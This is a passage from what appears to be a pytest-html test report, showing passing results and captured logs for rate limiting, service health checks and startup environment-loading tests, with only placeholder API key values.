-----------------------------\n\n======================================================================\nTEST RESULT: test_rate_limiting_effectiveness - PASSED\nDuration: 1.02s\nCategory: security\nMetrics:\n  rate_limit_effective: True\n  allowed_requests: 10\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:08,505 - TestSecurity.test_rate_limiting_effectiveness - INFO - Testing rate limiting effectiveness\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 1 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 2 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 3 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 4 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 5 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 6 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 7 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 8 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 9 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 10 allowed\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Request 11 rate limited: Rate limit exceeded\n2025-12-18 09:29:08,506 - TestSecurity.test_rate_limiting_effectiveness - INFO - \u2705 Rate limiting working correctly\n\n------------------------------ Captured log call -------------------------------\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 Testing rate limiting effectiveness\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 1 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 2 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 3 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 4 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 5 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 6 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 7 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 8 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 9 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 10 allowed\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Request 11 rate limited: Rate limit exceeded\nINFO     TestSecurity.test_rate_limiting_effectiveness:test_framework.py:390 \u2705 Rate limiting working correctly\n\n&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_all_services&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_all_services&#34;, &#34;duration&#34;: &#34;5 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_all_services&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;5 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_connection_error&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_connection_error&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_connection_error&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_healthy&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_healthy&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_healthy&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_unhealthy&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_unhealthy&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_anvil_unhealthy&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_connection_error&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_connection_error&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_connection_error&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_healthy&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_healthy&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_healthy&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_timeout&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_timeout&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_timeout&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_unhealthy&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_unhealthy&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_http_service_unhealthy&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_service_health_unknown_service&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_check_service_health_unknown_service&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_check_service_health_unknown_service&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_get_service_status&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_get_service_status&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_get_service_status&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_initialization&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_print_health_report&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_print_health_report&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_print_health_report&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_success&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_timeout&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_timeout&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestServiceHealthChecker::test_wait_for_service_timeout&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.service_health:service_health.py:145 \u274c poc_api failed to become ready within 2s timeout\n\n&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_check_all_services_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_check_all_services_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_check_all_services_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_check_service_health_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_check_service_health_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_check_service_health_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_get_service_status_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_get_service_status_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_get_service_status_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_print_health_report_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_print_health_report_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_print_health_report_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_all_services_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_all_services_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_all_services_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_service_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_service_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_service_health.py::TestConvenienceFunctions::test_wait_for_service_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_empty_key&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_empty_key&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_load_environment_empty_key&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Loading environment configuration from .env file...\n\u2705 Environment variables loaded from .env file (1 variables)\n\u274c Missing required environment variables: GROQ_API_KEY\n\u2139\ufe0f Please set the missing variables in your .env file or environment\n\u2139\ufe0f Example: GROQ_API_KEY=gsk_your-api-key-here\n\n======================================================================\nTEST RESULT: test_load_environment_empty_key - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,539 - INFO - Loading environment configuration from .env file...\n2025-12-18 09:29:11,539 - INFO - Environment variables loaded from .env file (1 variables)\n2025-12-18 09:29:11,539 - ERROR - Missing required environment variables: GROQ_API_KEY\n2025-12-18 09:29:11,539 - INFO - Please set the missing variables in your .env file or environment\n2025-12-18 09:29:11,539 - INFO - Example: GROQ_API_KEY=gsk_your-api-key-here\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Loading environment configuration from .env file...\nINFO     scripts.startup.start_servers:start_servers.py:100 Environment variables loaded from .env file (1 variables)\nERROR    scripts.startup.start_servers:start_servers.py:102 Missing required environment variables: GROQ_API_KEY\nINFO     scripts.startup.start_servers:start_servers.py:106 Please set the missing variables in your .env file or environment\nINFO     scripts.startup.start_servers:start_servers.py:106 Example: GROQ_API_KEY=gsk_your-api-key-here\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_malformed_file&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_malformed_file&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_load_environment_malformed_file&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Loading environment configuration from .env file...\n\u2705 Environment variables loaded from .env file (1 variables)\n\u274c Missing required environment variables: GROQ_API_KEY\n\u2139\ufe0f Please set the missing variables in your .env file or environment\n\u2139\ufe0f Example: GROQ_API_KEY=gsk_your-api-key-here\n\n======================================================================\nTEST RESULT: test_load_environment_malformed_file - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,540 - INFO - Loading environment configuration from .env file...\n2025-12-18 09:29:11,541 - WARNING - Skipping malformed line 1 in .env file: INVALID_LINE\n2025-12-18 09:29:11,541 - INFO - Environment variables loaded from .env file (1 variables)\n2025-12-18 09:29:11,541 - ERROR - Missing required environment variables: GROQ_API_KEY\n2025-12-18 09:29:11,541 - INFO - Please set the missing variables in your .env file or environment\n2025-12-18 09:29:11,541 - INFO - Example: GROQ_API_KEY=gsk_your-api-key-here\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Loading environment configuration from .env file...\nWARNING  scripts.startup.start_servers:start_servers.py:124 Skipping malformed line 1 in .env file: INVALID_LINE\nINFO     scripts.startup.start_servers:start_servers.py:100 Environment variables loaded from .env file (1 variables)\nERROR    scripts.startup.start_servers:start_servers.py:102 Missing required environment variables: GROQ_API_KEY\nINFO     scripts.startup.start_servers:start_servers.py:106 Please set the missing variables in your .env file or environment\nINFO     scripts.startup.start_servers:start_servers.py:106 Example: GROQ_API_KEY=gsk_your-api-key-here\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_missing_file&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_missing_file&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_load_environment_missing_file&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u274c Missing required environment variables: GROQ_API_KEY\n\u2139\ufe0f Please set the missing variables in your .env file or environment\n\u2139\ufe0f Example: GROQ_API_KEY=gsk_your-api-key-here\n\n======================================================================\nTEST RESULT: test_load_environment_missing_file - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,541 - ERROR - Missing required environment variables: GROQ_API_KEY\n2025-12-18 09:29:11,541 - INFO - Please set the missing variables in your .env file or environment\n2025-12-18 09:29:11,541 - INFO - Example: GROQ_API_KEY=gsk_your-api-key-here\n\n------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.start_servers:start_servers.py:102 Missing required environment variables: GROQ_API_KEY\nINFO     scripts.startup.start_servers:start_servers.py:106 Please set the missing variables in your .env file or environment\nINFO     scripts.startup.start_servers:start_servers.py:106 Example: GROQ_API_KEY=gsk_your-api-key-here\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_load_environment_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_load_environment_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u2139\ufe0f Loading environment configuration from .env file...\n\u2705 Environment variables loaded from .env file (1 variables)\n\u2705 GROQ_API_KEY configured (gsk_test_key)\n\n======================================================================\nTEST RESULT: test_load_environment_success - PASSED\nDuration: 0.00s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,542 - INFO - Loading environment configuration from .env file...\n2025-12-18 09:29:11,542 - INFO - Environment variables loaded from .env file (1 variables)\n2025-12-18 09:29:11,542 - INFO - GROQ_API_KEY configured (gsk_test_key)\n\n------------------------------ Captured log call -------------------------------\nINFO     scripts.startup.start_servers:start_servers.py:106 Loading environment configuration from .env file...\nINFO     scripts.startup.start_servers:start_servers.py:100 Environment variables loaded from .env file (1 variables)\nINFO     scripts.startup.start_servers:start_servers.py:100 GROQ_API_KEY configured (gsk_test_key)\n\n&#34;}], &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_missing_files&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_missing_files&#34;, &#34;duration&#34;: &#34;43 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_startup_scripts.py::TestServerManager::test_validate_dependencies_missing_files&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;43 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\u274c Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/api/poc-api/app.py\n\u274c Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/frontend/web-legacy/app.py\n\u26a0\ufe0f Next.js frontend directory not found - Next.js UI will not be available\n\u2705 Python package &amp;#x27;flask&amp;#x27; available\n\u2705 Python package &amp;#x27;flask_cors&amp;#x27; available\n\u2705 Python package &amp;#x27;werkzeug&amp;#x27; available\n\u2705 Python package &amp;#x27;requests&amp;#x27; available\n\n======================================================================\nTEST RESULT: test_validate_dependencies_missing_files - PASSED\nDuration: 0.04s\nCategory: startup\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:29:11,543 - ERROR - Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/api/poc-api/app.py\n2025-12-18 09:29:11,543 - ERROR - Required file not found: /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpfw9ikfgc/src/frontend/web-legacy/app.py\n2025-12-18 09:29:11,543 - 